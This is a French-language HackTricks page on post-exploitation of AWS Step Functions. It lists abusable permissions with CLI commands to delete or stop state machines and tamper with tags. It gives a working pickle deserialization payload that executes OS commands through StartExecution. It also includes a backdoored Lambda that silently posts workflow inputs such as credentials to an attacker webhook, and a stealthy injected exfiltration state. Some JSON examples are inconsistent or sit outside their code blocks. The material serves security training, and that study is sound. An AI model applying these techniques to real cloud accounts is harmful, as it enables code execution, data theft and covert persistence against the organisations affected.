# AWS - Step Functions Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## Step Functions

Pour plus d'informations sur ce service AWS, consultez :

{{#ref}}
../../aws-services/aws-stepfunctions-enum.md
{{#endref}}

### `states:RevealSecrets`

Cette permission permet de **révéler des données secrètes à l'intérieur d'une exécution**. Pour cela, il faut définir le niveau d'inspection sur TRACE et le paramètre revealSecrets sur true.

<figure><img src="../../../images/image (348).png" alt=""><figcaption></figcaption></figure>

### `states:DeleteStateMachine`, `states:DeleteStateMachineVersion`, `states:DeleteStateMachineAlias`

Un attaquant disposant de ces permissions pourrait supprimer définitivement des state machines, leurs versions et alias. Cela peut perturber des workflows critiques, entraîner une perte de données et nécessiter un temps important pour récupérer et restaurer les state machines affectées. De plus, cela permettrait à un attaquant d'effacer les traces utilisées, de perturber les enquêtes forensiques et potentiellement de paralyser les opérations en supprimant des processus d'automatisation essentiels et des configurations d'état.

> [!NOTE]
>
> - En supprimant une state machine, vous supprimez également toutes ses versions et alias associés.
> - En supprimant un alias de state machine, vous ne supprimez pas les versions de state machine faisant référence à cet alias.
> - Il n'est pas possible de supprimer une version de state machine actuellement référencée par un ou plusieurs alias.
```bash
# Delete state machine
aws stepfunctions delete-state-machine --state-machine-arn <value>
# Delete state machine version
aws stepfunctions delete-state-machine-version --state-machine-version-arn <value>
# Delete state machine alias
aws stepfunctions delete-state-machine-alias --state-machine-alias-arn <value>
```
- **Impact potentiel**: perturbation des workflows critiques, perte de données et indisponibilité opérationnelle.

### `states:UpdateMapRun`

Un attaquant disposant de cette permission pourrait manipuler la configuration d'échec de Map Run et le paramètre parallel, pouvant augmenter ou diminuer le nombre maximal d'exécutions enfants de workflow autorisées, affectant directement les performances du service. De plus, un attaquant pourrait altérer le pourcentage et le nombre de défaillances tolérées, pouvant réduire cette valeur à 0, de sorte que chaque fois qu'un élément échoue, le Map Run entier échouerait, affectant directement l'exécution de la state machine et perturbant potentiellement des workflows critiques.
```bash
aws stepfunctions update-map-run --map-run-arn <value> [--max-concurrency <value>] [--tolerated-failure-percentage <value>] [--tolerated-failure-count <value>]
```
- **Impact potentiel**: Dégradation des performances et perturbation des processus critiques.

### `states:StopExecution`

Un attaquant disposant de cette autorisation pourrait être en mesure d'arrêter l'exécution de n'importe quelle machine d'état, perturbant les workflows et processus en cours. Cela pourrait entraîner des transactions incomplètes, l'arrêt des opérations métier et une corruption potentielle des données.

> [!WARNING]
> Cette action n'est pas prise en charge par les **express state machines**.
```bash
aws stepfunctions stop-execution --execution-arn <value> [--error <value>] [--cause <value>]
```
- **Impact potentiel**: Perturbation des workflows en cours, indisponibilité opérationnelle et possible corruption des données.

### `states:TagResource`, `states:UntagResource`

Un attacker pourrait ajouter, modifier ou supprimer des tags sur les ressources Step Functions, perturbant l'allocation des coûts de votre organisation, le suivi des ressources et les politiques de contrôle d'accès basées sur les tags.
```bash
aws stepfunctions tag-resource --resource-arn <value> --tags Key=<key>,Value=<value>
aws stepfunctions untag-resource --resource-arn <value> --tag-keys <key>
```
**Potential Impact**: Perturbation de l'allocation des coûts, du suivi des ressources et des politiques de contrôle d'accès basées sur les tags.

---

### `states:StartExecution` -> Injection d'input dans des sinks dangereux

`states:StartExecution` est un point d'entrée data-plane. Si une state machine transfère un input contrôlé par l'attaquant vers une task qui contient un sink dangereux (par exemple une Lambda qui exécute `pickle.loads(base64.b64decode(payload_b64))`), vous pouvez parfois transformer **StartExecution** en **code execution** et **secret exfiltration** via la sortie d'exécution, sans aucune permission pour mettre à jour la state machine.

#### Découvrir le workflow et la Lambda invoquée

Si vous avez `states:List*` / `states:Describe*`, vous pouvez énumérer et lire la définition de la state machine :
```bash
REGION=us-east-1
SM_ARN="<state_machine_arn>"

aws stepfunctions describe-state-machine --region "$REGION" --state-machine-arn "$SM_ARN" --query definition --output text
```
Si vous avez également `lambda:GetFunction`, vous pouvez télécharger le bundle de code Lambda pour comprendre comment les entrées sont traitées (et confirmer si unsafe deserialization existe) :
```bash
LAMBDA_ARN="<lambda_arn_from_definition>"
CODE_URL="$(aws lambda get-function --region "$REGION" --function-name "$LAMBDA_ARN" --query 'Code.Location' --output text)"
curl -sSL "$CODE_URL" -o /tmp/lambda.zip
unzip -o /tmp/lambda.zip -d /tmp/lambda_code >/dev/null
ls -la /tmp/lambda_code
```
#### Exemple : pickle conçu dans l'entrée d'exécution (Python)

Si la Lambda effectue unpickle de données contrôlées par l'attaquant, un pickle malveillant peut exécuter du code lors de la désérialisation. Exemple de payload qui évalue une expression Python dans le runtime Lambda :
```bash
PAYLOAD_B64="$(python3 - <<'PY'
import base64, pickle

class P:
def __reduce__(self):
# Replace with a safe proof (e.g. "1+1") or a target-specific read.
return (eval, ("__import__('os').popen('id').read()",))

print(base64.b64encode(pickle.dumps(P())).decode())
PY
)"

EXEC_ARN="$(aws stepfunctions start-execution --region "$REGION" --state-machine-arn "$SM_ARN" --input "{\"payload_b64\":\"$PAYLOAD_B64\"}" --query executionArn --output text)"
aws stepfunctions describe-execution --region "$REGION" --execution-arn "$EXEC_ARN" --query output --output text
```
**Impact** : Toutes les permissions dont dispose le rôle de tâche (Secrets Manager reads, S3 writes, KMS decrypt, etc.) peuvent être atteintes via une entrée spécialement conçue, et le résultat peut être renvoyé dans la sortie d'exécution de Step Functions.

### `states:UpdateStateMachine`, `lambda:UpdateFunctionCode`

Un attaquant qui compromet un utilisateur ou un rôle disposant des permissions suivantes :
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "AllowUpdateStateMachine",
"Effect": "Allow",
"Action": "states:UpdateStateMachine",
"Resource": "*"
},
{
"Sid": "AllowUpdateFunctionCode",
"Effect": "Allow",
"Action": "lambda:UpdateFunctionCode",
"Resource": "*"
}
]
}
```
...peut mener une **attaque post-exploitation à fort impact et discrète** en combinant Lambda backdooring avec la manipulation de la logique Step Function.

Ce scénario suppose que la victime utilise **AWS Step Functions pour orchestrer des workflows qui traitent des entrées sensibles**, telles que credentials, tokens ou PII.

Exemple d'invocation de la victime:
```bash
aws stepfunctions start-execution \
--state-machine-arn arn:aws:states:us-east-1:<victim-account-id>:stateMachine:LegitStateMachine \
--input '{"email": "victim@example.com", "password": "hunter2"}' --profile victim
```
Si la Step Function est configurée pour invoquer une Lambda comme `LegitBusinessLogic`, l'attaquant peut procéder à **deux variantes d'attaque furtives** :

---

####  Mise à jour de la lambda function

L'attaquant modifie le code de la lambda function déjà utilisée par la Step Function (`LegitBusinessLogic`) pour exfiltrer silencieusement les données d'entrée.
```python
# send_to_attacker.py
import requests

def lambda_handler(event, context):
requests.post("https://webhook.site/<attacker-id>/exfil", json=event)
return {"status": "exfiltrated"}
```

```bash
zip function.zip send_to_attacker.py

aws lambda update-function-code \
--function-name LegitBusinessLogic \
--zip-file fileb://function.zip -profile attacker
```
#### Ajouter un état malveillant au Step Function

Alternativement, l'attaquant peut injecter un **exfiltration state** au début du workflow en mettant à jour la définition du Step Function.
```malicious_state_definition.json
{
"Comment": "Backdoored for Exfiltration",
"StartAt": "OriginalState",
"States": {
"OriginalState": {
"Type": "Task",
"Resource": "arn:aws:lambda:us-east-1:<victim-id>:function:LegitBusinessLogic",
"End": true
}
}
}

```

```bash
aws stepfunctions update-state-machine \
--state-machine-arn arn:aws:states:us-east-1:<victim-id>:stateMachine:LegitStateMachine \
--definition file://malicious_state_definition.json --profile attacker
```
L'attaquant peut être encore plus furtif en mettant à jour la définition d'état comme ceci
{
"Comment": "Backdoored for Exfiltration",
"StartAt": "ExfiltrateSecrets",
"States": {
"ExfiltrateSecrets": {
"Type": "Task",
"Resource": "arn:aws:lambda:us-east-1:victim-id:function:SendToAttacker",
"InputPath": "$",
"ResultPath": "$.exfil",
"Next": "OriginalState"
},
"OriginalState": {
"Type": "Task",
"Resource": "arn:aws:lambda:us-east-1:victim-id:function:LegitBusinessLogic",
"End": true
}
}
}
où la victime ne remarquera pas la différence

---

### Victim Setup (Context for Exploit)

- A Step Function (`LegitStateMachine`) is used to process sensitive user input.
- Il appelle une ou plusieurs fonctions Lambda telles que `LegitBusinessLogic`.

---

**Impact potentiel**:
- Exfiltration silencieuse de données sensibles, y compris des secrets, identifiants, clés API et PII.
- Aucun erreur ou échec visible dans l'exécution du workflow.
- Difficile à détecter sans auditer le code des fonctions Lambda ou les traces d'exécution.
- Permet une persistance à long terme si la backdoor reste dans le code ou la logique ASL.


{{#include ../../../../banners/hacktricks-training.md}}
